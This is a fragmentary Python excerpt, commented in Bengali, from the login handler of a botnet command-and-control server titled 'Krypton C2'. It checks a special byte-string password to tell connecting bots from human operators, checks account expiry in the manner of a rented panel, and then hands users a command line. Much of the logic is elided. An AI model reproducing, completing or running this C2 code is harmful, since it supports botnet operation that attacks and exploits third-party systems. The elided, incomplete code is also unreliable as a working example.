...
def handle_client(client, address):
    try:
        send(client, "\33]0;Krypton C2 | Login\a", False)
        ...
        while not password.strip():
            ...
            # পাসওয়ার্ডে বিশেষ অক্ষর থাকতে পারে তাই cp1252 রাখা হয়েছে
            password = client.recv(1024).decode('cp1252', errors='ignore').strip()

        # Human login check
        if password != '\xff\xff\xff\xff\75':
            send(client, ansi_clear, False)

            # find_login থেকে রেজাল্ট নেওয়া
            ...
            if success:
                ...
                # টাইটেল আপডেট করার জন্য আলাদা থ্রেড
                threading.Thread(target=update_title, args=(client, username, data_Expiration_str), daemon=True).start()
                
                # কমান্ড লাইন শুরু করা (এটি থ্রেড ছাড়া কল করা ভালো যাতে কানেকশন ওপেন থাকে)
                command_line(client, username)
                return 
            else:
                # ভুল পাসওয়ার্ড বা মেয়াদ শেষ হলে
                if data_Expiration_str == "expired":
                    send(client, f'\r\n{Fore.RED}Account Expired!')
                else:
                    send(client, f'\r\n{Fore.RED}Invalid credentials!')
